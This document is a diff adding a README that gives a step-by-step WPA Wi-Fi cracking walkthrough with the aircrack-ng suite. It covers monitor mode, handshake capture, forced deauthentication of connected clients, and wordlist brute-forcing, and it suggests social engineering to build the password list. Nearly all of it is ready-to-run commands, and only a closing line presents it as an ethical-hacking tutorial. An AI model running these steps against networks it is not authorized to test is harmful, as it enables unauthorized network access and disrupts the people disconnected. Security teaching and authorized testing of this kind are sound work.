@@ -1,1 +1,106 @@
+# Instruction
+
+## link youtube video: 
+
+Find your current interface configuration, you should use a wifi module that have embedded the mopnitor mode functions.
+
+***Does my WI-FI supports monitor mode?***
+---> #https://blog.rottenwifi.com/wifi-monitoring-mode/#Does_My_Wi-fi_Support_Monitor_Mode
+
+run this command to see the available interface on your machine
+
+```
+$ ifconfig
+```
+
+if you you want to enable an interface use this command
+
+```
+$ ifconfig {interfaceName} up
+```
+In case of the video i use the embedded wlan0 
+
+```
+$ ifconfig wlan0 up
+```
+
+Use airmon-ng start wlan0 to enable monitor mode on the wireless interface
+
+```
+$ airmon-ng start wlan0
+```
+
+Once it's enable run the command to monitor all the Wi-Fi signal nearby
+
+```
+$airodump-ng wlan0 
+```
+
+choose a connection that you want to try
+
+***I suggest to use meanwhile a file, in which you save notes during all the process, this will be helpful for the next steps.***
+
+create a directory, in which you will save the file.cap that will be generated during the dumps.
+
+```
+$ mkdir /....
+```
+
+run the command below to start sniffing the connection, the aim is to find a four handshake made by the modem, when a device disconnects himself from the Wi-Fi.
+The command to run contains various option.
+Below the command and details:
+
+```
+$ airodump-ng wlan0mon -c 10 --bssid {MAC_ADDRESS} -w ./..{crack.cap}
+```
+
+***A briefly description of the option:***
+
+```
+-c  indicates the channel trasmission of the modem
+
+-bssid  indicates the Basic Service Set Identifier
+
+-w indicates the location to write the files
+```
+
+Now we have to wait until a device will request a deauth
+
+Boring? 
+
+There is a command to speed up this waiting, simulating a deauth from one device connected to the current target modem.
+
+```
+$ aireplay-ng -0 18 -a {MAC_ADDRESS} -c {MAC_ADDRESS} wlan0mon
+```
+
+***A briefly description of the option***
+
+```
+-0 indicates the number of the deauth tempatives packets 
+-a MAC_ADDRESS of the modem
+-c MAC_ADDRESS of the device to imperson for the deauth
+```
+
+If we are lucky there will be a line outputed on the logs from the command airdump (running on background).
+
+*** Example ***
+
+WPA handshake: {MAC_ADDRESS}
+
+
+Finally it's time to crack
+
+utilizing the file {name}.cap generated from the airdump command, we run the command
+
+```
+aircrack-ng -a2 -b {MAC_ADDRESS} -w {wordListPasswordFile} {name}.cap 
+```
+
+***the major difficulty could be guessing the right password, if we use some social engineering we can build a small list password word to brute force. Moreover we can go with big files, maybe we will find the password or not (In this case is trivial to chose a complex password so it will be very very difficult to hack***
+
+
+
+
+ 
 ## Disclaimer: Hacking without permission is illegal. This repo is strictly educational for learning about cyber-security in the areas of ethical hacking and penetration testing so that we can protect ourselves against the real hackers.
